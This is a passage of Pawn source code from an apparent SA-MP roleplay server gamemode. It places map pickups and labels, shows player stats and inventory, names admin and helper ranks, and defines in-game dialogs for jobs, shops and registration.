    Create3DTextLabel("Department Motor Of Vehicles\n{01A9DB}/getlicense {FFFFFF}to get a license", COLOR_WHITE, 1959.3208,-1129.9222,987.5298, 15, 0, 1);
	//Adminisland pickups
    CreatePickup(1314,1,2906.0601,-1648.6394,13.0189); //Gate 1 Enter
	CreatePickup(1314,1,3303.5818,-1776.8317,12.8457); // Gate 2 Enter
	CreatePickup(1318,1,3357.2056,-1794.0542,14.2500); //Admin Club Enter
	CreatePickup(1313,1,3261.2825,-1909.4198,2.4781); //Ship Enter
	CreatePickup(1252,1,3246.9561,-1926.7743,4.7422); //Ship Move Position
    //Cityhall Options
    CreatePickup(1239, 1, 361.8711,173.8035,1008.3828); // SERVICES
    Create3DTextLabel("{FF6347}{FF6347}Name Service: {00FF00}/namechange\n{FF6347}Gender Service: {00FF00}/sexchange\n{FF6347}Age Service: {00FF00}/agechange\n{FF6347}Phone Service: {00FF00}/phchange", COLOR_LIGHTRED, 361.8711,173.8035,1008.3828+0.7, 15, 0, 1);
    // Entrance
	DOCPickup = CreatePickup(1239, 1, 806.7476,-2431.9968,14.0009); // NG
	BUYPickup = CreatePickup(1239, 1, -1558.5209,-2723.1025,48.7435); // BuyProduct
	WithdrawPickup = CreatePickup(1239, 1, -1772.3883,1011.3082,97.8391); // Withdraw Icon
	DepositPickup = CreatePickup(1239, 1, 1772.6588,1014.2200,97.8236); // Deposit Icon
	VIPPickup = CreatePickup(1239, 1, 1831.0460,-1075.4194,23.8367); // VIP
    CityHallPickup = CreatePickup(1239, 1, 1480.9678,-1771.8704,18.7958); // CityHall
    GymPickup = CreatePickup(1239, 1, 2229.9487,-1721.3040,13.5618); // Gym
    DrugPickup = CreatePickup(1239, 1, 2165.9492,-1671.1947,15.0732); // Seeds House
    cocainePickup = CreatePickup(1239, 1, 2351.9326,-1170.6655,28.0747); // Cocaine Lab
    FactoryPickup = CreatePickup(1239, 1, 65.4823,-292.5736,1.5781); // Factory Pickup
    DMVPickup = CreatePickup(1239, 1, 2045.6598,-1908.0221,13.5469); // DMV Pickup
    SaintsPickup = CreatePickup(1239, 1, 1172.4875,-1323.2266,15.4027); // All Saints Pickup
    BankPickup = CreatePickup(1239, 1, 1462.4424,-1011.7301,26.8438); // Bank Pickup
    Create3DTextLabel("{FFFFFF}City Hall", COLOR_YELLOW, 1480.9678,-1771.8704,18.7958, 15, 0, 1);
    Create3DTextLabel("{FFFFFF}San Andreas Prison", COLOR_YELLOW, 806.7476,-2431.9968,14.0009, 15, 0, 1);
    Create3DTextLabel("{FFFFFF}Product Company", COLOR_YELLOW, -1558.5209,-2723.1025,48.7435, 15, 0, 1);
    Create3DTextLabel("VIP Lounge", COLOR_VIP, 1831.0460,-1075.4194,23.8367, 15, 0, 1);
    Create3DTextLabel("{FFFFFF}Ganton Gym", COLOR_YELLOW, 2229.9487,-1721.3040,13.5618, 15, 0, 1);
    Create3DTextLabel("{FFFFFF}Seeds House", COLOR_YELLOW, 2165.9492,-1671.1947,15.0732, 15, 0, 1);
    Create3DTextLabel("{FFFFFF}Cocaine Lab", COLOR_YELLOW, 2351.9326,-1170.6655,28.0747, 15, 0, 1);
    Create3DTextLabel("{FFFFFF}Drug Factory", COLOR_YELLOW, 65.4823,-292.5736,1.5781, 15, 0, 1);
    Create3DTextLabel("{FFFFFF}Department Motor Of Vehicles", COLOR_YELLOW, 2045.6598,-1908.0221,13.5469, 15, 0, 1);
    Create3DTextLabel("{FFFFFF}All Saints General Hospital", COLOR_YELLOW, 1172.4875,-1323.2266,15.4027, 15, 0, 1);
    Create3DTextLabel("{FFFFFF}Bank", COLOR_YELLOW, 1462.4424,-1011.7301,26.8438, 15, 0, 1);
    // Products Pickup 1
    CreatePickup(1279, 1, -63.0331,-1121.3658,1.1607); // Products Pickup 1
    Create3DTextLabel("Products Pickup\n{01A9DB}/load {FFFFFF}to get some products", COLOR_WHITE, -63.0331,-1121.3658,1.1607+0.9, 30, 0, 1);
    // Products Pickup 2
    CreatePickup(1279, 1, -60.0844,-1112.7158,1.1274); // Products Pickup 2
    Create3DTextLabel("Products Pickup\n{01A9DB}/load {FFFFFF}to get some products", COLOR_WHITE, -60.0844,-1112.7158,1.1274+0.9, 30, 0, 1);
    // Jobs
    CreatePickup(1239, 1, -76.8260,-1136.7341,1.0781); // Trucker Job
    Create3DTextLabel("{FFFFFF}Job Place\n{FFFF00}Trucker\n{FFFFFF}Type {FFFF00}/join {FFFFFF}to get that job", COLOR_WHITE, -76.8260,-1136.7341,1.0781+0.5, 30, 0, 1);
    CreatePickup(1239, 1, 2227.9976,-1718.2604,13.5321); // Bodyguard Job
    Create3DTextLabel("{FFFFFF}Job Place\n{FFFF00}Bodyguard\n{FFFFFF}Type {FFFF00}/join {FFFFFF}to get that job", COLOR_WHITE, 2227.9976,-1718.2604,13.5321+0.5, 15, 0, 1);
    CreatePickup(1239, 1, 2330.0693,-2315.4709,13.5469); // Mechanic Job
    Create3DTextLabel("{FFFFFF}Job Place\n{FFFF00}Mechanic\n{FFFFFF}Type {FFFF00}/join {FFFFFF}to get that job", COLOR_WHITE, 2330.0693,-2315.4709,13.5469+0.5, 15, 0, 1);
    CreatePickup(1239, 1, 1380.8300,-1088.7698,27.3844); // Lawyer Job
    Create3DTextLabel("{FFFFFF}Job Place\n{FFFF00}Lawyer\n{FFFFFF}Type {FFFF00}/join {FFFFFF}to get that job", COLOR_WHITE, 1380.8300,-1088.7698,27.3844+0.5, 15, 0, 1);
    CreatePickup(1239, 1, 2178.5518,-1660.4418,14.9644); // Drugs Dealer Job
    Create3DTextLabel("{FFFFFF}Job Place\n{FFFF00}Drugs Dealer\n{FFFFFF}Type {FFFF00}/join {FFFFFF}to get that job", COLOR_WHITE, 2178.5518,-1660.4418,14.9644+0.5, 15, 0, 1);
    CreatePickup(1239, 1, 2354.7354,-1170.1056,28.0475); // Drugs Smuggler Job
    Create3DTextLabel("{FFFFFF}Job Place\n{FFFF00}Drugs Smuggler\n{FFFFFF}Type {FFFF00}/join {FFFFFF}to get that job", COLOR_WHITE, 2354.7354,-1170.1056,28.0475+0.5, 15, 0, 1);
   	CreatePickup(1239, 1, 2097.8765,-111.1796,8.1172);// Weapons Dealer Job
	Create3DTextLabel("{FFFFFF}Job Place\n{FFFF00}Weapons Dealer\n{FFFFFF}Type {FFFF00}/join {FFFFFF}to get that job", COLOR_RED, 2097.8765,-111.1796,8.1172, 15, 0, 1);
	CreatePickup(1239, 1, 2112.5371,-121.4570,2.1263); // Weapons Smuggler Job
    Create3DTextLabel("{FFFFFF}Job Place\n{FFFF00}Weapons Smuggler\n{FFFFFF}Type {FFFF00}/join {FFFFFF}to get that job", COLOR_RED, 2112.5371,-121.4570,2.1263, 15, 0, 1);
    //paintball text
    Create3DTextLabel("{FFFFFF}Paintball Arena\n{01A9DB}/startpb {FFFFFF}to create a paintball game\n{01A9DB}/enterpb {FFFFFF}to join a paintball game", COLOR_WHITE, 1310.1110,-1368.5656,14.517786, 20,0,1);
    CreatePickup(1313, 1, 1310.1110,-1368.5656,13.517786); // paintball pickup
    // arrest place
    CreateDynamic3DTextLabel("Jail Arrest Point\n{01A9DB}/arrest {FFFFFF}to arrest a suspect", COLOR_WHITE, 1527.1012,-1677.6177,5.8906, 12);
	CreatePickup(1314, 1, 1527.1012,-1677.6177,5.8906);
	CreatePickup(1247, 1, 870.4260,-2341.1616,13.0859); // Deliver
    Create3DTextLabel("{FFFFFF}Suspect Deliver Point\nType {01A9DB}/deliver {FFFFFF}to deliver suspect", COLOR_WHITE, 870.4260,-2341.1616,13.0859, 30, 0, 1);
	// Materials Pickups
	CreatePickup(348, 1, 2128.8381,-102.9780,2.1263); // low Materials Pickup
    Create3DTextLabel("Low Materials Pickup\n{01A9DB}/getmats {FFFFFF}to get some packages", COLOR_WHITE, 2128.8381,-102.9780,2.1263, 15, 0, 1);
    CreatePickup(356, 1, 2118.5664,-103.2024,2.1263); //med Materials Pickup
    Create3DTextLabel("Medium Materials Pickup\n{01A9DB}/getmats {FFFFFF} to get some packages", COLOR_WHITE, 2118.5664,-103.2024,2.1263, 15, 0, 1);
    CreatePickup(351, 1, 2120.7715,-114.0335,2.1263); //high Materials Pickup
    Create3DTextLabel("High Materials Pickup\n{01A9DB}/getmats {FFFFFF} to get some packages", COLOR_WHITE, 2120.7715,-114.0335,2.1263, 15, 0, 1);
    CreatePickup(348, 1, 2676.7568,-1542.1117,25.1067); // Materials Dropoff
    Create3DTextLabel("Low Materials Dropoff\n{01A9DB}/delivermats {FFFFFF}to deliver packages", COLOR_WHITE, 2676.7568,-1542.1117,25.1067, 15, 0, 1);
    CreatePickup(356, 1, 251.6972,-156.0768,1.5703); //med Materials Dropoff
    Create3DTextLabel("Medium Materials Dropoff\n{01A9DB}/delivermats {FFFFFF}to deliver packages", COLOR_WHITE, 251.6972,-156.0768,1.5703, 15, 0, 1);
    CreatePickup(351, 1, 34.7790,-2647.2515,40.7285); //high Materials Dropoff
    Create3DTextLabel("High Materials Dropoff\n{01A9DB}/delivermats {FFFFFF}to deliver packages", COLOR_WHITE, 34.7790,-2647.2515,40.7285, 15, 0, 1);
    print("Static pickups loaded.");
    //Adminisland 3dtextlabels
     Create3DTextLabel("{~Admin Island Gate 1~}", 0x2641FEAA,2906.0601,-1648.6394,13.0189,100.0, 0); //Gate1 Text
    Create3DTextLabel("{~Admin Island Gate 2~}", 0x2641FEAA,3303.5818,-1776.8317,12.8457,100.0, 0); //Gate2 Text
    Create3DTextLabel("{~Admin Club~}", 0xC2A2DAAA,3357.2056,-1794.0542,14.2500,100.0, 0); //Admin Club Text
    Create3DTextLabel("{~Admin Ship~}", 0x1DBCEBFF,3261.2825,-1909.4198,2.4781,100.0, 0); //Admin Club Text
    Create3DTextLabel("{~Admin Island Shop~}", 0xAA3333AA,3342.3894,-1719.6432,12.8942,100.0, 0); //Admin Club Text
    Create3DTextLabel("{~Admin Island Ship Move~}", 0xAA3333AA,3246.9561,-1926.7743,4.7422,100.0, 0); //Ship Move Position Text
    //Adminisland Moving objects
    Ship = CreateObject(8493, 3249.76074, -1915.40479, 14.25000,   0.00000, 0.00000, 164.00000); //Ship Object
    Ship1 = CreateObject(9159, 3249.91553, -1915.26013, 14.06402,   0.00000, 0.00000, 163.75000); //Ship Object 1
    Shark = CreateObject(1608, 3225.66357, -1858.81152, 0.35000,   0.00000, 0.00000, 181.99646); //Shark Object
	return 1;
}

stock ShowStats(playerid, user)
{
	new string[256], gender[8], famed[12], helper[12], vip[12], Float:H, Float:A, ogate1[8], ogate2[8], gate3[8], beta[12];
	// Gender
	if(Player[user][pGender] == 1) format(gender, sizeof(gender), "Male");
	else if(Player[user][pGender] == 2) format(gender, sizeof(gender), "Female");
	// Helper
	if(Player[user][pHelper]) format(helper, sizeof(helper), "{00FF00}Yes");
	else if(!Player[user][pHelper]) format(helper, sizeof(helper), "{00FF00}No");
	// Famed
	if(Player[user][pFamed]) format(famed, sizeof(famed), "{FF9900}Yes");
	else if(!Player[user][pFamed]) format(famed, sizeof(famed), "{FF9900}No");
	// VIP
	if(Player[user][pVIP]) format(vip, sizeof(vip), "{C93CCE}Yes");
	else if(!Player[user][pVIP]) format(vip, sizeof(vip), "{C93CCE}No");
	// Beta Tester
	if(Player[user][pTester]) format(beta, sizeof(beta), "{FFFF00}Yes");
	else if(!Player[user][pTester]) format(beta, sizeof(beta), "{FFFF00}No");
	// Gates
	if(Player[user][pGate][0]) format(ogate1, sizeof(ogate1), "Yes");
	else if(!Player[user][pGate][0]) format(ogate1, sizeof(ogate1), "None");
	if(Player[user][pGate][1]) format(ogate2, sizeof(ogate2), "Yes");
	else if(!Player[user][pGate][1]) format(ogate2, sizeof(ogate2), "None");
	if(Player[user][pGate][2]) format(gate3, sizeof(gate3), "Yes");
	else if(!Player[user][pGate][2]) format(gate3, sizeof(gate3), "None");
	// Respect points and next level
	new exp = Player[user][pExp];
	new nxtlevel = Player[user][pLevel]+1;
	new expamount = nxtlevel*4;
	new costlevel = nxtlevel*2000;
	// Health and Armor
	GetPlayerHealth(user, H); GetPlayerArmour(user, A);
	/* ------------------------[ Old Stats ] ------------------------
	format(string, sizeof(string), "Level: [%d]  Gender: [%s]  Age: [%d]  Respect: [%d/%d (%d)]  Upgrade Points: [%d]  Money: [$%d]  Bank: [$%d]", Player[user][pLevel], gender, Player[user][pAge], exp, expamount, costlevel, Player[user][pUpgradePoints], Player[user][pMoney], Player[user][pBank]);
	SendClientMessage(playerid, COLOR_LIGHTRED, string);
	format(string, sizeof(string), "Job: [%s]  Wanted: [%d]  Crimes: [%d]  Arrested: [%dx]  Health: [%0.1f]  Armor: [%0.1f]",RPJN(user),  Player[user][pWanted], Player[user][pCrimes], Player[user][pArrested], H, A);
	SendClientMessage(playerid, COLOR_LIGHTRED, string);
	format(string, sizeof(string), "Faction: [%s]  Rank: [%s]  Division: [%s]  Family: [%s]  Rank: [%s]", RPFNEx(user), RPFRN(user), RPFDN(user), RPFaN(user), RPFaRN(user));
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "Helper: [{00FF00}%s{FFFFFF}]  Moderator: [{FF9966}%s{FFFFFF}]  Famed: [{FF9900}%s{FFFFFF}]  VIP: [{C93CCE}%s{FFFFFF}]", helper, mode, famed, vip);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "Vehicles: 1[%s (ID:%d)] - 2[%s (ID:%d)] - 3[%s (ID:%d)] - 4[%s (ID:%d)]", RVN(GetVehicleModel(Player[user][pVeh])), Player[user][pVeh], RVN(GetVehicleModel(Player[user][pVVeh])), Player[user][pVVeh], RVN(GetVehicleModel(Player[user][pVVVeh])), Player[user][pVVVeh], RVN(GetVehicleModel(Player[user][pVVVVeh])), Player[user][pVVVVeh]);
	SendClientMessage(playerid, 0x0489B1FF, string);
	format(string, sizeof(string), "Business: [%s (ID: %s)]  House: [%s (ID: %s)]  Garage: [%s - ID:%s]", RBT(Player[user][pBiz]), RPBK(user), HT(Player[user][pHouse]), RPHK(user), GT(Player[user][pGarage]), RPGK(user));
	SendClientMessage(playerid, 0x0489B1FF, string);*/
	//Showing stats
	format(string, sizeof(string), "|__________ Stats of %s __________|", GetName(user));
	SendClientMessage(playerid, COLOR_ORANGE, string);
	format(string, sizeof(string), "Level: [%d] Gender: [%s] Age: [%d] Respect: [%d/%d (%d)] Money: [$%d] Bank: [$%d]", Player[user][pLevel], gender, Player[user][pAge], exp, expamount, costlevel, Player[user][pMoney], Player[user][pBank]);
	SendClientMessage(playerid, COLOR_GRAD2, string);
	format(string, sizeof(string), "Job: [%s] Wanted: [%d] Crimes: [%d] Arrested: [%dx] Health: [%0.1f] Armor: [%0.1f]",RPJN(user),  Player[user][pWanted], Player[user][pCrimes], Player[user][pArrested], H, A);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "Faction: [%s]  Rank: [%s]  Division: [%s]  Family: [%s]  Rank: [%s]", RPFN(user), RPFRN(user), RPFDN(user), RPFaN(user), RPFaRN(user));
	SendClientMessage(playerid, COLOR_GRAD2, string);
	format(string, sizeof(string), "Helper: [%s{FFFFFF}] Famed: [%s{FFFFFF}] VIP: [%s{FFFFFF}] Beta Tester: [%s{FFFFFF}]", helper, famed, vip, beta);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "Gate 1: [%s] Gate 2: [%s] Gate 3: [%s] Garage: 1[%s - (ID:%s)] - 2[%s - (ID:%s)]", ogate1, ogate2, gate3, GT(Player[user][pGarage]), RPGK(user), GT(Player[user][pVGarage]), RPVIPGK(user));
	SendClientMessage(playerid, COLOR_GRAD2, string);
	format(string, sizeof(string), "Vehicles: 1[%s (ID:%d)] - 2[%s (ID:%d)] - 3[%s (ID:%d)] - 4[%s (ID:%d)]", RVN(GetVehicleModel(Player[user][pVeh])), Player[user][pVeh], RVN(GetVehicleModel(Player[user][pVVeh])), Player[user][pVVeh], RVN(GetVehicleModel(Player[user][pVVVeh])), Player[user][pVVVeh], RVN(GetVehicleModel(Player[user][pVVVVeh])), Player[user][pVVVVeh]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "Business: 1[%s (ID:%s)] - 2[%s (ID:%s)] House: 1[%s (ID:%s)] - 2[%s (ID:%s)]", RBT(Player[user][pBiz]), RPBK(user), RBT(Player[user][pVBiz]), RPVIPBK(user), HT(Player[user][pHouse]), RPHK(user), HT(Player[user][pVHouse]), RPVIPHK(user));
	SendClientMessage(playerid, COLOR_GRAD2, string);
	SendClientMessage(playerid, COLOR_LIGHTSALMON, "** For information about your inventory use the '/inv' command.");
	return 1;
}
stock ShowInv(playerid, user)
{
	new string[128];
	// Inventory
	format(string, sizeof(string), "|__________ Inventory of %s __________|", GetName(user));
	SendClientMessage(playerid, COLOR_ORANGE, string);
	format(string, sizeof(string), "Weed:[%d] Seed: [%d] Cocaine:[%d] Cigars:[%d] Sprunk:[%d] Spraycan:[%d]", Player[user][pWeed], Player[user][pSeeds], Player[user][pCocaine], Player[user][pCigar], Player[user][pSprunk], Player[user][pSpray]);
	SendClientMessage(playerid, COLOR_GRAD2, string);
	format(string, sizeof(string), "Phone: [%d] WalkieTalkie: [%d] Cookies: [%d]", Player[user][pPhone], Player[user][pWTC], Player[user][pCookie]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "Low-Materials: [%d] Medium-Materials: [%d] High-Materials: [%d]", Player[user][pLMaterials], Player[user][pMMaterials], Player[user][pHMaterials]);
	SendClientMessage(playerid, COLOR_GRAD2, string);
	format(string, sizeof(string), "Gas Can:[%d litres] Ropes:[%d] Blindfolds:[%d]", Player[user][pGas], Player[user][pRope], Player[user][pBlindfold]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	SendClientMessage(playerid, COLOR_LIGHTSALMON, "** For information about your accessories use the '/toys' command.");
	return 1;
}



stock RWN(weaponid)
{
	new name[32];
	GetWeaponName(weaponid, name, sizeof(name));
	if(weaponid == 0) format(name, sizeof(name), "Hands");
	return name;
}

stock RPIP(playerid)
{
	new ip[16];
	GetPlayerIp(playerid, ip, sizeof(ip));
	return ip;
}

stock RPVIPN(playerid)
{
	new name[32];
	if(Player[playerid][pVIP] == 0) format(name, sizeof(name), "None");
	else if(Player[playerid][pVIP] == 1) format(name, sizeof(name), "Bronze");
	else if(Player[playerid][pVIP] == 2) format(name, sizeof(name), "Silver");
	else if(Player[playerid][pVIP] == 3) format(name, sizeof(name), "Gold");
	else if(Player[playerid][pVIP] == 4) format(name, sizeof(name), "Platinum");
	else if(Player[playerid][pVIP] == 5) format(name, sizeof(name), "Titan");
	return name;
}
stock RPAALN(playerid)
{
	new name[256];
	if(Player[playerid][pAdmin] == 2) format(name, sizeof(name), "{FF6347}International Roleplay\n{FFFFFF}%s\n{01A9DB}Junior Administrator", GetName(playerid));
	else if(Player[playerid][pAdmin] == 3) format(name, sizeof(name), "{FF6347}International Roleplay\n{FFFFFF}%s\n{01A9DB}General Administrator", GetName(playerid));
	else if(Player[playerid][pAdmin] == 4) format(name, sizeof(name), "{FF6347}International Roleplay\n{FFFFFF}%s\n{01A9DB}Senior Administrator", GetName(playerid));
	else if(Player[playerid][pAdmin] == 1337) format(name, sizeof(name), "{FF6347}International Roleplay\n{FFFFFF}%s\n{01A9DB}Head Administrator", GetName(playerid));
	else if(Player[playerid][pAdmin] == 99999) format(name, sizeof(name), "{FF6347}International Roleplay\n{FFFFFF}%s\n{01A9DB}Community Manager", GetName(playerid));
	else if(Player[playerid][pAdmin] == 100000) format(name, sizeof(name), "{FF6347}International Roleplay\n{FFFFFF}%s\n{01A9DB}Community Owner", GetName(playerid));
	return name;
}
stock RPALN(playerid)
{
	new name[32];
	if(Player[playerid][pAdmin] == 1) format(name, sizeof(name), "Server Moderator");
	if(Player[playerid][pAdmin] == 2) format(name, sizeof(name), "Junior Administrator");
	else if(Player[playerid][pAdmin] == 3) format(name, sizeof(name), "General Administrator");
	else if(Player[playerid][pAdmin] == 4) format(name, sizeof(name), "Senior Administrator");
	else if(Player[playerid][pAdmin] == 1337) format(name, sizeof(name), "Head Administrator");
	else if(Player[playerid][pAdmin] == 99999) format(name, sizeof(name), "Community Manager");
	else if(Player[playerid][pAdmin] == 100000) format(name, sizeof(name), "Community Owner");
	return name;
}
stock RMA(adminlevel)
{
	new name[32];
	if(adminlevel == 0) format(name, sizeof(name), "Player");
	if(adminlevel == 1) format(name, sizeof(name), "Server Moderator");
	if(adminlevel == 2) format(name, sizeof(name), "Junior Administrator");
	if(adminlevel == 3) format(name, sizeof(name), "General Administrator");
	if(adminlevel == 4) format(name, sizeof(name), "Senior Administrator");
	if(adminlevel == 1337) format(name, sizeof(name), "Head Administrator");
	if(adminlevel == 99999) format(name, sizeof(name), "Community Manager");
	if(adminlevel == 100000) format(name, sizeof(name), "Community Owner");
	return name;
}
stock RLEVEL(playerid)
{
	new name[32];
	if(Player[playerid][pLevel] == 1) format(name, sizeof(name), "Newbie");
	else if(Player[playerid][pLevel] >= 2) format(name, sizeof(name), "Player");
	return name;
}
stock RPMLN(playerid)
{
	new name[32];
	if(Player[playerid][pMapper] == 1) format(name, sizeof(name), "Mapper");
	else if(Player[playerid][pMapper] == 2) format(name, sizeof(name), "Second Mapping Bitch");
	else if(Player[playerid][pMapper] == 3) format(name, sizeof(name), "Third Mapping Bitch");
	else if(Player[playerid][pMapper] == 4) format(name, sizeof(name), "Forth Mapping Bitch");
	else if(Player[playerid][pMapper] == 5) format(name, sizeof(name), "Fifth Mapping Bitch");
	return name;
}
stock RPOSLN(playerid)
{
	new name[32];
	if(Player[playerid][pFamed] == 1) format(name, sizeof(name), "Famed");
	return name;
}
stock RPBTLN(playerid)
{
	new name[32];
	if(Player[playerid][pTester] == 1) format(name, sizeof(name), "Tester");
	return name;
}
stock RPMODLN(playerid)
{
	new name[32];
	if(Player[playerid][pStaffObserver] == 1) format(name, sizeof(name), "Staff Observer");
	return name;
}
stock RPHLN(playerid)
{
	new name[32];
	if(Player[playerid][pHelper] == 1) format(name, sizeof(name), "Junior Helper");
	else if(Player[playerid][pHelper] == 2) format(name, sizeof(name), "General Helper");
	else if(Player[playerid][pHelper] == 3) format(name, sizeof(name), "Senior Helper");
	else if(Player[playerid][pHelper] == 4) format(name, sizeof(name), "Asst. Head Helper");
	else if(Player[playerid][pHelper] == 5) format(name, sizeof(name), "Head Helper");
	else if(Player[playerid][pHelper] == 6) format(name, sizeof(name), "Big Boss");
	return name;
}
stock RHA(helperlevel)
{
	new name[32];
	if(helperlevel == 0) format(name, sizeof(name), "Player");
	if(helperlevel == 1) format(name, sizeof(name), "Junior Helper");
	if(helperlevel == 2) format(name, sizeof(name), "General Helper");
	if(helperlevel == 3) format(name, sizeof(name), "Senior Helper");
	if(helperlevel == 4) format(name, sizeof(name), "Asst. Head Helper");
	if(helperlevel == 5) format(name, sizeof(name), "Head Helper");
	return name;
}
stock Logged(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    if(Player[playerid][pLoggedIn])
	    {
	        return 1;
	    }
	}
	return 0;
}

stock SendNearbyMessageBB(playerid, Float:radius, string[], col1, col2, col3, col4, col5)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	new Float:ix, Float:iy, Float:iz;
	new Float:cx, Float:cy, Float:cz;
	foreach(Player, i)
	{
	    if(Logged(i))
	    {
	        if(GetPlayerInterior(playerid) == GetPlayerInterior(i) && GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i))
	        {
				GetPlayerPos(i, ix, iy, iz);
				cx = (x - ix);
				cy = (y - iy);
				cz = (z - iz);
				if(((cx < radius/16) && (cx > -radius/16)) && ((cy < radius/16) && (cy > -radius/16)) && ((cz < radius/16) && (cz > -radius/16)))
				{
				    SendClientMessage(i, col1, string);
				}
				else if(((cx < radius/8) && (cx > -radius/8)) && ((cy < radius/8) && (cy > -radius/8)) && ((cz < radius/8) && (cz > -radius/8)))
				{
				    SendClientMessage(i, col2, string);
				}
				else if(((cx < radius/4) && (cx > -radius/4)) && ((cy < radius/4) && (cy > -radius/4)) && ((cz < radius/4) && (cz > -radius/4)))
				{
				    SendClientMessage(i, col3, string);
				}
				else if(((cx < radius/2) && (cx > -radius/2)) && ((cy < radius/2) && (cy > -radius/2)) && ((cz < radius/2) && (cz > -radius/2)))
				{
				    SendClientMessage(i, col4, string);
				}
				else if(((cx < radius) && (cx > -radius)) && ((cy < radius) && (cy > -radius)) && ((cz < radius) && (cz > -radius)))
				{
				    SendClientMessage(i, col5, string);
				}
			}
	    }
	}
	return 1;
}

stock IsPlayerNearPlayer(playerid, targetid, Float:radius)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(targetid, x, y, z);
	if(IsPlayerInRangeOfPoint(playerid, radius ,x, y, z))
	{
	    return 1;
	}
	return 0;
}

stock IsPlayerNearVehicle(playerid, vehicleid, Float:radius)
{
	new Float:x, Float:y, Float:z;
	GetVehiclePos(vehicleid, x, y, z);
	if(IsPlayerInRangeOfPoint(playerid, radius ,x, y, z))
	{
	    return 1;
	}
	return 0;
}

stock ShowDialog(playerid, dialogid)
{
    new string[256];
	switch(dialogid)
	{
	    case 0: // Tutorial Dialog
		{
			ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Do you wish to see the tutorial?","It is highly recommended that you see the tutorial as it explains the script itself, no RP tests.", "Yes", "No");
		}
		case 1: // Register
		{
		    ShowPlayerDialog(playerid, 1, DIALOG_STYLE_PASSWORD, "Register Panel", "Welcome to International Roleplay.\n\nPlease write down your desired password in-order to complete registration.", "Register", "Exit");
		}
		case 2: // Login
		{
		    ShowPlayerDialog(playerid, 2, DIALOG_STYLE_PASSWORD, "Login Panel","Welcome to International Roleplay.\n\nPlease write down your password in-order to complete logging in.", "Login", "Exit");
		}
		case 3: // Male/Female
		{
		    ShowPlayerDialog(playerid, 3, DIALOG_STYLE_LIST, "Choose your character's gender from the following chooses.", "Male\nFemale", "Choose", "");
		}
		case 4: // Age
		{
		    ShowPlayerDialog(playerid, 4, DIALOG_STYLE_INPUT, "Write down your desired age to be the age of your character.", "(15-80)", "Complete", "");
		}
		case 5: // LSPD Lockers
		{
		    ShowPlayerDialog(playerid, 5, DIALOG_STYLE_LIST, "LSPD Lockers", "Duty\nArmory\nUniforms\nClear Record\nUndercover", "Choose", "Cancel");
		}
		case 6: // LSPD Armory
		{
		    ShowPlayerDialog(playerid, 6, DIALOG_STYLE_LIST, "LSPD Lockers", "Nightstick ($50)\nMace ($100)\nDesert Eagle ($200)\nShotgun ($100)\nMP5 ($600)\nM4 ($1000)\nCombat Shotgun ($1500)\nSniper Rifle ($2500)\nPainkiller ($100)\nVest ($200)", "Choose", "Cancel");
		}
		case 7: // Clothes Dialog
		{
		    ShowPlayerDialog(playerid, 7, DIALOG_STYLE_INPUT, "Clothes","Choose your clothes (( Skin ID ))", "Choose", "Cancel");
		}
		case 8: // Smartphone Browse 1
		{
		    ShowPlayerDialog(playerid, 8, DIALOG_STYLE_MSGBOX, "Smartphone Web Browser > www.emp3world.com","Downloading a song costs $50\n\n1) Champaigne Showers - LMFAO      2) Club can't Handle Me - David Guetta", "Next", "Close");
		}
		case 9: // Mechanic
		{
		    ShowPlayerDialog(playerid, 9, DIALOG_STYLE_LIST, "Mechanic Tools", "Repair Vehicle\nAdd/Remove Nitros\nAdd/Remove Hydraulics\nRemove Vehicle Components", "Choose", "Cancel");
		}
		case 10: // VIP Mechanic
		{
		    ShowPlayerDialog(playerid, 10, DIALOG_STYLE_LIST, "VIP Mechanic Tools", "Repair Vehicle\nAdd Nitros\nAdd/Remove Hydraulics", "Choose", "Cancel");
		}
		case 16: // VIP Dialog
		{
		    ShowPlayerDialog(playerid, 16, DIALOG_STYLE_LIST, "VIP Center:", "{CD7F32}VIP Color\n{CD7F32}VIP Statistics\n{cd7f32}VIP Mechanic\n{cd7f32}VIP Clothes\n{D3D3D3}VIP Tuning\n{D3D3D3}VIP Advertisement\n{D3D3D3}VIP Gun Shop\n{FFD700}VIP Spawn Point\n{B4A0BF}VIP {FFD700}Special {D3D3D3}Weapons\n{B4A0BF}VIP Vehicle Model", "Choose", "Cancel");
		}
		case 17: // Changing Skin
		{
		    ShowPlayerDialog(playerid, 17, DIALOG_STYLE_INPUT, "VIP Skin Change","Choose a skin between 0 and 299", "Choose", "Cancel");
		}
		case 18: // Change name
		{
		    ShowPlayerDialog(playerid, 18, DIALOG_STYLE_INPUT, "VIP Name Change","Type in your new name (Admins will approve/disapprove ASAP)", "Submit", "Cancel");
		}
		case 19: // Weapons Shop
		{
			ShowPlayerDialog(playerid, 19, DIALOG_STYLE_LIST, "VIP Weapons Shop", "9mm ($1000)\nDesert Eagle ($20000)\nShotgun ($10000)", "Choose", "Cancel");
		}
		case 20: // VIP advertise
		{
		    ShowPlayerDialog(playerid, 20, DIALOG_STYLE_INPUT, "VIP Advertisement","Type in the advertisement you wish to create", "Choose", "Cancel");
		}
		case 22: // Fighting Styles
		{
		    ShowPlayerDialog(playerid, 22, DIALOG_STYLE_LIST, "Choose a style", "Normal ($3,000)\nBoxing ($3,000)\nKung-Fu ($3,000)\nKnee-Head ($3,000)\nGrab-Kick ($3,000)\nElbow ($3,000)", "Choose", "Cancel");
		}
		case 23: // Toys
		{
			// 1 Glasses, 2 watches, 3 bandana, 4 hats
